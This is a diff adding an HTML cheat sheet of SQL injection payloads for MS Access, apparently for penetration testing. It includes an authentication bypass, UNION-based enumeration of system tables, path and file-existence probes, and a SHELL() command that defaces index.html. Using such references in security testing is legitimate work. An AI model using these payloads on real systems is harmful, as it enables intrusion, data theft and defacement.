@@ -1,0 +1,66 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Queries</title>
+</head><body>Unfortunately, MS Access doesn't support typical operators that are traditionally used during SQL injection testing, including:<br/>
+&nbsp;No comments characters<br/>
+&nbsp;No stacked queries<br/>
+&nbsp;No LIMIT operator<br/>
+&nbsp;No SLEEP or BENCHMARK alike operators<br/>
+&nbsp;and many other<br/>
+<br/>
+AUTH <br/>
+BYPASS: &#09;' OR 1=1%00 (or " OR 1=1%00)<br/>
+COMMENT: &#09;Using a null byte %00 within a SQL query results in MS Access ignoring all remaining characters. <br/>
+&nbsp;&#09;&#09;&#09;0x16 (%16 in URL encoded format).<br/>
+CONCAT:&#09;&#09;String concatenation is possible by using &amp; (%26) and + (%2b) characters.<br/>
+UNION: &#09;&#09;UNION operator is supported, but it needs a valid table name in the FROM clause.<br/>
+SUBQUERY:&#09;example: ' AND (SELECT TOP 1 'someData' FROM validTableName)%00<br/>
+TOP: &#09;&#09;Specify the max results that the query should return from top. example TOP 1 will return only 1 row.<br/>
+MID: &#09;&#09;return extract substring, example the following statement: mid('abc',1,1) returns 'a'<br/>
+LEN: &#09;&#09;len of string passed as param ' UNION SELECT LEN('1234') FROM validTableName%00 returns 4<br/>
+ASC: &#09;&#09;Obtain ASCII value of a char passed as input: ' UNION SELECT ASC('A') FROM ValidTable%00 : <ul><li style="list-style-type: none">&nbsp;&#09;&#09;returns 65 (ASCII value for 'A')</li>
+</ul>
+CHR: &#09;&#09;Obtain char of ASCII value passed as input: ' UNION SELECT CHR(65) FROM validTableName%00 <br/>
+&nbsp;&#09;&#09;&#09;returns 'A'<br/>
+IIF: &#09;&#09;&#09;Is the IF construct, for example the following statement IIF(1=1, 'a', 'b') return 'a'<br/>
+LAST: &#09;&#09;This function is used to select only the last row of a set of rows. For example the following query SELECT last(*) FROM users will return only the last row of the result.<br/>
+GROUP:&#09;&#09;' GROUP BY Id%00<br/>
+&nbsp;&#09;&#09;&#09;' GROUP BY ID, SecondAttrName, ...%00<br/>
+&nbsp;&#09;&#09;&#09;to enumerate all parameters<br/>
+<br/>
+Unfortunately, in the default configuration of recent MS Access database releases, these tables are not accessible. Nevertheless, it is always worth trying:<br/>
+&nbsp;MSysObjects&#09;&#09;Fields: Connect, Database, DataCreate, DataUpdate, Flags, ForeignName, Id, Lv, LxExtra<br/>
+&nbsp;&#09;&#09;&#09;&#09;LvModule, LvProp, Name, Owner, ParentId, RmtInfoLong, RmtInfoShort, Type<br/>
+&nbsp;MSysACEs&#09;&#09;Fields: ACM, FInheritable, ObjectId, SID<br/>
+&nbsp;MSysAccessXML&#09;Fields: Id, LValue, ObjectGuid, ObjectName, Property, Value<br/>
+&nbsp;MSysQueries<br/>
+&nbsp;MSysRelationships<br/>
+<br/>
+For example, if a union SQL injection vulnerability exists, you can use the following query to get db table names:<br/>
+' UNION SELECT Name FROM MSysObjects WHERE Type = 1%00<br/>
+<br/>
+.mdb file within the application webroot can allow to download the entire database. Database filenames can be inferred with the following query:<br/>
+http://www.example.com/page.app?id=1'+UNION+SELECT+1+FROM+name.table%00<br/>
+<br/>
+where name is the .mdb filename and table is a valid database table<br/>
+<br/>
+<b>Return 0 rows</b>:<br/>
+&nbsp;' AND 1=0 UNION SELECT AttrName1,AttrName2 FROM validTableName%00<br/>
+<b><br/>
+</b><b>Find web root dir:</b>&nbsp; <br/>
+&nbsp;You can find the web root directory trying to select something from an inexistent database. <br/>
+&nbsp;MS Access will response with an error message containing the full path name :<br/>
+&nbsp;' UNION SELECT 1 FROM ThisIsAFakeName.FakeTable%00<br/>
+<br/>
+<b>Verify file existence</b>:<br/>
+&nbsp;' UNION SELECT name FROM msysobjects IN '\boot.ini'%00 : (if file exists) an error message is obtained (it informs that the database format was not recognized).<br/>
+<br/>
+<b>Registry protection</b><br/>
+It's possible to block the use of critical functions (such as SHELL(), etc ...) by setting this register key :<br/>
+&nbsp;\\HKEY_LOCAL_MACHINE\Software\Microsoft\Jet\4.0\engines\SandboxMode<br/>
+Its default value is 2, so by default it's impossible to use these functions: CurDIR() and Shell()<br/>
+<br/>
+CURDIR:&#09;&#09;' UNION SELECT CurDir(),1,1 FROM validTableName%00<br/>
+SHELL:&#09;&#09;' AND SHELL('cmd.exe /c echo owned &gt; c:\path\name\index.html')%00</body></html>
